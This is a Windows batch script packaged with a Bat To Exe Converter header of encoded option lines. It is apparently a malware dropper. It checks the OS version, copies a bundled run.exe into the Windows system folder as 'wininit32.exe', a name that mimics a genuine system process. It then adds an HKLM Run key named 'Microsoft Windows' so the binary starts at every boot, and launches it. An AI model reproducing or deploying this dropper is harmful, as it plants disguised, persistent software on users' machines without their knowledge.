::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWHreyHcjLQlHcAWGMWK0OpEZ++Pv4Pq7p0AfUeYDa5vayKCyIewW+FGqY5Q+tg==
::fBE1pAF6MU+EWHreyHcjLQlHcAWGMWK0OpEZ++Pv4Pq7rVgJRPcrRJ3O1PqLOOVz
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFBpQQQ2MAE+/Fb4I5/jH6/+KoAMUV+1f
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF65
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF65
::ZR41oxFsdFKZSTk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpSI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFBpQQQ2MAE+/Fb4I5/jH7OaSoEgJQOdxfZfeug==
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
setlocal
for /f "tokens=4-5 delims=. " %%i in ('ver') do set VERSION=%%i.%%j
if "%version%" == "11.0" goto go
if "%version%" == "10.0" goto go
if "%version%" == "6.3" goto go
if "%version%" == "6.2" goto go
if "%version%" == "6.1" goto go
rem etc etc
endlocal
::if failure
start wscript %b2eincfilepath%\alert.vbs
timeout -t 1 > nul
exit
:go
move %b2eincfilepath%\run.exe %SYSTEMROOT%\wininit32.exe
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Microsoft Windows" /t REG_SZ /F /D "%SYSTEMROOT%\wininit32.exe"
start %SYSTEMROOT%\wininit32.exe
exit
